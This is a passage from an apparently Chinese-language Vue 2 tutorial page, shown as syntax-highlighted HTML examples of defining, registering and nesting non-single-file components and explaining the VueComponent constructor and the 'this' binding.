class="name">address</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;showName&quot;</span>&gt;</span>点我提示学校名<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span></span></span><br><span class="line">        `,</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                schoolName:<span class="string">&#x27;电信学院&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                address:<span class="string">&#x27;北京&#x27;</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">showName</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                alert(<span class="built_in">this</span>.schoolName)</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">// 第一步：创建student组件</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> student = Vue.extend(&#123;</span></span><br><span class="line">        template:`</span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学生名字：</span><span class="template-variable">&#123;&#123;<span class="name">studentName</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学生年龄：</span><span class="template-variable">&#123;&#123;<span class="name">age</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line">        `,</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                studentName:<span class="string">&#x27;小明&#x27;</span>,</span></span><br><span class="line">                age:18</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">// 第一步：创建hello组件</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> hello = Vue.extend(&#123;</span></span><br><span class="line">        template:`</span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>你好啊！</span><span class="template-variable">&#123;&#123;<span class="name">name</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line">        `,</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                name:<span class="string">&#x27;Tom&#x27;</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">//第二步：注册组件（全局注册）</span></span></span><br><span class="line"><span class="javascript">    Vue.component(<span class="string">&#x27;hello&#x27;</span>,hello)</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 创建vm</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="javascript">            msg:<span class="string">&#x27;你好啊！&#x27;</span>,</span></span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="comment">//第二步：注册组件（局部注册）</span></span></span><br><span class="line">        components:&#123;</span><br><span class="line">            school:school,</span><br><span class="line">            student:student</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="javascript">     <span class="comment">// 创建vm</span></span></span><br><span class="line"><span class="javascript">     <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&#x27;#root2&#x27;</span>,</span></span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="43-非单文件组件（几个注意点）"><a href="#43-非单文件组件（几个注意点）" class="headerlink" title="43.非单文件组件（几个注意点）"></a>43.非单文件组件（几个注意点）</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>非单文件组件（几个注意点）<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--引入Vue--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/jscript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">      几个注意点：</span></span><br><span class="line"><span class="comment">        1.关于组件名：</span></span><br><span class="line"><span class="comment">            一个单词组成：</span></span><br><span class="line"><span class="comment">                第一种写法（首字母小写）：school；</span></span><br><span class="line"><span class="comment">                第二种写法（首字母大写）：School；</span></span><br><span class="line"><span class="comment">            多个单词组成：</span></span><br><span class="line"><span class="comment">                第一种写法（kebab-case命名）：my-school；</span></span><br><span class="line"><span class="comment">                第二种写法（CamelCase命名）：MySchool；（需要Vue脚手架支持）</span></span><br><span class="line"><span class="comment">            备注：</span></span><br><span class="line"><span class="comment">                (1).组件名尽可能回避HTML中原有的元素名称，列如：h2、H2都不行；</span></span><br><span class="line"><span class="comment">                (2).可以使用name配置项指定组件在开发者工具中呈现的名字；</span></span><br><span class="line"><span class="comment">        2.关于组件标签：</span></span><br><span class="line"><span class="comment">            第一种写法：&lt;my-school&gt;&lt;/my-school&gt;；</span></span><br><span class="line"><span class="comment">            第二种写法：&lt;my-school/&gt;；</span></span><br><span class="line"><span class="comment">            备注：不用脚手架时，&lt;my-school/&gt;会导致后续组件不能渲染；</span></span><br><span class="line"><span class="comment">        3.一个简写方式：</span></span><br><span class="line"><span class="comment">            const s = Vue.extend(options) 可简写为：const s = options</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123;msg&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--  第三步：编写组件标签 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">my-school</span>&gt;</span><span class="tag">&lt;/<span class="name">my-school</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">// 第一步：创建school组件</span></span></span><br><span class="line"><span class="javascript">   <span class="keyword">const</span> s = Vue.extend(&#123;</span></span><br><span class="line"><span class="javascript">        name:<span class="string">&#x27;MySchool&#x27;</span>,</span></span><br><span class="line">        template:`</span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校名字：</span><span class="template-variable">&#123;&#123;<span class="name">schoolName</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校地址：</span><span class="template-variable">&#123;&#123;<span class="name">address</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;showName&quot;</span>&gt;</span>点我提示学校名<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span></span></span><br><span class="line">        `,</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                schoolName:<span class="string">&#x27;电信学院&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                address:<span class="string">&#x27;北京&#x27;</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">showName</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                alert(<span class="built_in">this</span>.schoolName)</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="javascript">    <span class="comment">//第一步：创建school组件(简写)</span></span></span><br><span class="line">    /*const s = &#123;</span><br><span class="line"><span class="javascript">        name:<span class="string">&#x27;MySchool&#x27;</span>,</span></span><br><span class="line">        template:`</span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校名字：</span><span class="template-variable">&#123;&#123;<span class="name">schoolName</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校地址：</span><span class="template-variable">&#123;&#123;<span class="name">address</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;showName&quot;</span>&gt;</span>点我提示学校名<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span></span></span><br><span class="line">        `,</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                schoolName:<span class="string">&#x27;电信学院&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                address:<span class="string">&#x27;北京&#x27;</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">showName</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                alert(<span class="built_in">this</span>.schoolName)</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;*/</span><br><span class="line"><span class="javascript">    <span class="comment">// 创建vm</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="javascript">            msg:<span class="string">&#x27;你好啊！&#x27;</span>,</span></span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="comment">//第二步：注册组件（局部注册）</span></span></span><br><span class="line">        components:&#123;</span><br><span class="line"><span class="javascript">            <span class="string">&#x27;my-school&#x27;</span>:s</span></span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line">     </span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="44-非单文件组件（组件嵌套）"><a href="#44-非单文件组件（组件嵌套）" class="headerlink" title="44.非单文件组件（组件嵌套）"></a>44.非单文件组件（组件嵌套）</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>非单文件组件（组件嵌套）<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--引入Vue--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/jscript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">      </span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--  第三步：编写组件标签 --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &lt;app&gt;&lt;/app&gt; --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">     <span class="comment">// 第一步：创建student组件</span></span></span><br><span class="line"><span class="javascript">     <span class="keyword">const</span> student = Vue.extend(&#123;</span></span><br><span class="line"><span class="javascript">        name:<span class="string">&#x27;student&#x27;</span>,</span></span><br><span class="line">        template:`</span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学生名字：</span><span class="template-variable">&#123;&#123;<span class="name">studentName</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学生年龄：</span><span class="template-variable">&#123;&#123;<span class="name">age</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line">        `,</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                studentName:<span class="string">&#x27;小明&#x27;</span>,</span></span><br><span class="line">                age:18</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">// 第一步：创建school组件</span></span></span><br><span class="line"><span class="javascript">   <span class="keyword">const</span> school = Vue.extend(&#123;</span></span><br><span class="line"><span class="javascript">        name:<span class="string">&#x27;MySchool&#x27;</span>,</span></span><br><span class="line">        template:`</span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校名字：</span><span class="template-variable">&#123;&#123;<span class="name">schoolName</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校地址：</span><span class="template-variable">&#123;&#123;<span class="name">address</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">student</span>&gt;</span><span class="tag">&lt;/<span class="name">student</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span></span></span><br><span class="line">        `,</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                schoolName:<span class="string">&#x27;电信学院&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                address:<span class="string">&#x27;北京&#x27;</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="comment">//注册组件（局部注册）</span></span></span><br><span class="line">        components:&#123;</span><br><span class="line">            student,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">// 第一步：创建hello组件</span></span></span><br><span class="line"><span class="javascript">   <span class="keyword">const</span> hello = Vue.extend(&#123;</span></span><br><span class="line"><span class="javascript">        name:<span class="string">&#x27;hello&#x27;</span>,</span></span><br><span class="line">        template:`</span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span></span><span class="template-variable">&#123;&#123;<span class="name">msg</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span></span></span><br><span class="line">        `,</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                msg:<span class="string">&#x27;欢迎来学习！&#x27;</span>,</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">// 第一步：创建app组件</span></span></span><br><span class="line"><span class="javascript">   <span class="keyword">const</span> app = Vue.extend(&#123;</span></span><br><span class="line"><span class="javascript">        name:<span class="string">&#x27;app&#x27;</span>,</span></span><br><span class="line">        template:`</span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">hello</span>&gt;</span><span class="tag">&lt;/<span class="name">hello</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">school</span>&gt;</span><span class="tag">&lt;/<span class="name">school</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span></span></span><br><span class="line">        `,</span><br><span class="line">        components:&#123;</span><br><span class="line">            hello,</span><br><span class="line">            school</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line"><span class="javascript">    <span class="comment">// 创建vm</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="javascript">            msg:<span class="string">&#x27;你好啊！&#x27;</span>,</span></span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="comment">//第二步：注册组件（局部注册）</span></span></span><br><span class="line">        components:&#123;</span><br><span class="line">            app</span><br><span class="line">        &#125;,</span><br><span class="line"><span class="handlebars"><span class="xml">        template:&#x27;<span class="tag">&lt;<span class="name">app</span>&gt;</span><span class="tag">&lt;/<span class="name">app</span>&gt;</span>&#x27;,</span></span></span><br><span class="line">    &#125;)</span><br><span class="line">     </span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="45-VueComponent构造函数"><a href="#45-VueComponent构造函数" class="headerlink" title="45.VueComponent构造函数"></a>45.VueComponent构造函数</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>VueComponent构造函数<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--引入Vue--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/jscript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">      关于VueComponent：</span></span><br><span class="line"><span class="comment">        1.school组件本质是一个VueComponent构造函数，且不是程序员定义的，是Vue.extend生成的。</span></span><br><span class="line"><span class="comment">        2.我们只需要写&lt;school&gt;&lt;/school&gt;或&lt;school/&gt;，Vue解析时会帮我们创建school组件的实例对象，</span></span><br><span class="line"><span class="comment">        即Vue帮我们执行的：new VueComponent(options)。</span></span><br><span class="line"><span class="comment">        3.特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent。</span></span><br><span class="line"><span class="comment">        4.关于this指向：</span></span><br><span class="line"><span class="comment">            (1).组件配置中：</span></span><br><span class="line"><span class="comment">                data函数、methods中的函数、watch中的函数、computed中的函数 它们中的this均指的是VueComponent实例对象。</span></span><br><span class="line"><span class="comment">            (2).new Vue()配置中：</span></span><br><span class="line"><span class="comment">                data函数、methods中的函数、watch中的函数、computed中的函数 它们中的this均指的是Vue实例对象。</span></span><br><span class="line"><span class="comment">        5.VueComponent的实例对象，以后简称VC（也可称之为：组件实例对象），</span></span><br><span class="line"><span class="comment">        Vue的实例对象，以后简称vm。</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">school</span>&gt;</span><span class="tag">&lt;/<span class="name">school</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;showName01&quot;</span>&gt;</span>点我提示<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">// 第一步：创建school组件</span></span></span><br><span class="line"><span class="javascript">   <span class="keyword">const</span> school = Vue.extend(&#123;</span></span><br><span class="line"><span class="javascript">        name:<span class="string">&#x27;MySchool&#x27;</span>,</span></span><br><span class="line">        template:`</span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校名字：</span><span class="template-variable">&#123;&#123;<span class="name">schoolName</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校地址：</span><span class="template-variable">&#123;&#123;<span class="name">address</span>&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;showName&quot;</span>&gt;</span>点我提示学校名字<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span></span></span><br><span class="line">        `,</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                schoolName:<span class="string">&#x27;电信学院&#x27;</span>,</span></span><br><span class="line"><span class="javascript">                address:<span class="string">&#x27;北京&#x27;</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">showName</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                alert(<span class="built_in">this</span>.schoolName)</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="string">&#x27;组件中的this指的是：&#x27;</span>,<span class="built_in">this</span>)</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line"><span class="javascript">    <span class="comment">// 创建vm</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">        data:&#123;</span><br><span class="line"><span class="javascript">            msg:<span class="string">&#x27;你好啊！&#x27;</span>,</span></span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="comment">//第二步：注册组件（局部注册）</span></span></span><br><span class="line">        components:&#123;</span><br><span class="line">            school</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">showName01</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="string">&#x27;Vue实例中的this指的是：&#x27;</span>,<span class="built_in">this</span>)</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line">     </span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span 